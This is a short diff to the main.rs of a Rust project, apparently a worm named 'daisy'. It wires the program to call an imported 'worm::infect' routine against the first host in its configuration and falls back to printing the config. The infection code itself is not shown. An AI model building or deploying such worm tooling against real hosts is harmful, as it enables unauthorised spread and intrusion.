@@ -21,7 +21,7 @@
 use std::path::PathBuf;
 
 use clap::Parser;
-use daisy::config::DaisyConfig;
+use daisy::{config::DaisyConfig, worm::infect};
 use log::LevelFilter;
 use simplelog::{ColorChoice, Config, TerminalMode};
 
@@ -52,18 +52,26 @@ fn main() {
             _ => LevelFilter::Trace,
         },
         Config::default(),
-        TerminalMode::Mixed,
+        TerminalMode::Stderr,
         ColorChoice::Auto,
     )
     .expect("Failed to initialize logging system");
 
     // Parse config file
-    let config = match DaisyConfig::load(&cli.config_file) {
+    let mut config = match DaisyConfig::load(&cli.config_file) {
         Ok(config) => config,
         Err(err) => {
             log::error!("Failed to load configuration: {}", err);
             return;
         }
     };
-    println!("{:?}", &config);
+
+    // If there is a host to connect to, do so.
+    // Otherwise, print the configuration object.
+    if config.hosts.is_empty() {
+        println!("{:?}", &config);
+    } else {
+        let host = config.hosts.remove(0);
+        infect(&host, &config).unwrap();
+    }
 }
